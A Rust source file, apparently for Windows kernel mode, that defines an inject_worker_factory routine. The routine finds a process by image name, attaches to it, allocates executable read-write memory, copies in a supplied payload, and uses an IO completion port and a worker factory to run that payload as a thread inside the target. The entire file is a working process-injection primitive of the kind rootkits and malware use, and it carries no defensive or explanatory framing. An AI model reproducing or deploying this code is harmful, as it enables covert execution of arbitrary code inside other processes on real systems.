#![no_std]
#![feature(core_intrinsics)]

#[repr(C, packed)]
pub struct ProcFuncs {
    pub zw_create_worker_factory: ntdef::functions::ZwCreateWorkerFactory,
    pub zw_set_information_worker_factory: ntdef::functions::ZwSetInformationWorkerFactory,
    pub zw_create_io_completion: ntdef::functions::ZwCreateIoCompletion,
    pub obf_dereference_object: ntdef::functions::ObfDereferenceObject,
    pub ps_lookup_process_by_process_id: ntdef::functions::PsLookupProcessByProcessId,
    pub ps_get_process_image_file_name: ntdef::functions::PsGetProcessImageFileName,
    pub ke_stack_attach_process: ntdef::functions::KeStackAttachProcess,
    pub ke_unstack_detach_process: ntdef::functions::KeUnstackDetachProcess,
    pub zw_allocate_virtual_memory: ntdef::functions::ZwAllocateVirtualMemory,
    pub ex_allocate_pool: ntdef::functions::ExAllocatePool,
    pub ex_free_pool_with_tag: ntdef::functions::ExFreePoolWithTag,
    pub io_completion_handle: ntdef::types::PHANDLE,
    pub worker_factory_handle: ntdef::types::PHANDLE,
    pub minimum_threads_ptr: ntdef::types::PVOID,
    pub user_address_ptr: *mut ntdef::types::PVOID,
    pub process_ptr: *mut ntdef::structs::PEPROCESS,
}

pub unsafe fn inject_worker_factory(funcs: *const ProcFuncs, target_process_name: *mut u8,
    usermode_payload: *mut u8, mut usermode_payload_size: u32, usermode_routine_parameter: ntdef::types::PVOID)
-> u32 {
    *((*funcs).io_completion_handle) = core::ptr::null_mut();
    *((*funcs).worker_factory_handle) = core::ptr::null_mut();
    *((*funcs).minimum_threads_ptr) = 1;
    *((*funcs).user_address_ptr) = core::ptr::null_mut();
    *((*funcs).process_ptr) = core::ptr::null_mut();

    let mut ret_val: u32 = 9;
    let apc_state: ntdef::structs::PKAPC_STATE = ((*funcs).ex_allocate_pool)(
        ntdef::enums::POOL_TYPE::NonPagedPool, core::mem::size_of::<ntdef::structs::KAPC_STATE>()
    ) as _;
    let mut pid: u32 = 0;
    while pid < 0xffff as _ {
        pid += 4;
        let mut status = ((*funcs).ps_lookup_process_by_process_id)(pid as _, (*funcs).process_ptr as _);
        if !ntdef::macros::NT_SUCCESS(status) {
            continue;
        }
        let process_name: ntdef::types::PCHAR = ((*funcs).ps_get_process_image_file_name)(*((*funcs).process_ptr));
        let process_name_len: isize = ntdef::macros::Strlen(process_name as _);
        let equal_name: u32 = ntdef::macros::RtlEqualMemory(
            target_process_name, process_name as _, process_name_len
        );
        if equal_name == 0 as _ {
            ((*funcs).obf_dereference_object)(*((*funcs).process_ptr));
            continue;
        }
        ((*funcs).ke_stack_attach_process)(*((*funcs).process_ptr), apc_state);

        let process_handle: ntdef::types::HANDLE = -1 as _;     // current process

        let payload_size: *mut usize = ((*funcs).ex_allocate_pool)(
            ntdef::enums::POOL_TYPE::NonPagedPool, 8
        ) as _;
        *payload_size = usermode_payload_size as _;

        status = ((*funcs).zw_allocate_virtual_memory)(
            process_handle,
            (*funcs).user_address_ptr,
            0 as _,
            payload_size,
            ntdef::enums::MEM_COMMIT,
            ntdef::enums::PAGE_EXECUTE_READWRITE
        );

        ((*funcs).ex_free_pool_with_tag)(payload_size as _, 1340);

        if !ntdef::macros::NT_SUCCESS(status) {
            ret_val = 1;
            ((*funcs).ke_unstack_detach_process)(apc_state);
            ((*funcs).obf_dereference_object)(*((*funcs).process_ptr));
            continue;
        }
        ntdef::macros::RtlCopyMemory(
            *((*funcs).user_address_ptr) as _,
            usermode_payload as _,
            usermode_payload_size as _
        );

        // TODO: usermode_routine_parameter should be copied in process' address space if not NULL

        status = ((*funcs).zw_create_io_completion)(
            (*funcs).io_completion_handle as _,
            ntdef::enums::IO_COMPLETION_ALL_ACCESS,
            core::ptr::null_mut(),
            1 as _
        );
        if !ntdef::macros::NT_SUCCESS(status) {
            ret_val = 2;
            ((*funcs).ke_unstack_detach_process)(apc_state);
            ((*funcs).obf_dereference_object)(*((*funcs).process_ptr));
            break;
        }

        status = ((*funcs).zw_create_worker_factory)(
            (*funcs).worker_factory_handle as _,
            ntdef::enums::WORKER_ACCESS,
            core::ptr::null_mut(),
            *((*funcs).io_completion_handle) as _,
            process_handle,
            *((*funcs).user_address_ptr),
            usermode_routine_parameter,
            1,
            32768,
            32768
        );
        if !ntdef::macros::NT_SUCCESS(status) {
            ret_val = 3;
            ((*funcs).ke_unstack_detach_process)(apc_state);
            ((*funcs).obf_dereference_object)(*((*funcs).process_ptr));
            break;
        }

        status = ((*funcs).zw_set_information_worker_factory)(
            *((*funcs).worker_factory_handle) as _,
            ntdef::enums::WORKER_FACTORY_INFORMATION_CLASS::WorkerFactoryMinimumThreadInformation,
            (*funcs).minimum_threads_ptr as _,
            core::mem::size_of::<u32>() as _
        );
        if !ntdef::macros::NT_SUCCESS(status) {
            ret_val = 4;
            ((*funcs).ke_unstack_detach_process)(apc_state);
            ((*funcs).obf_dereference_object)(*((*funcs).process_ptr));
            break;
        }
        ret_val = 0;

        ((*funcs).ke_unstack_detach_process)(apc_state);
        ((*funcs).obf_dereference_object)(*((*funcs).process_ptr));

        break;
    }
    ((*funcs).ex_free_pool_with_tag)(apc_state as _, 1337);
    return ret_val;
}
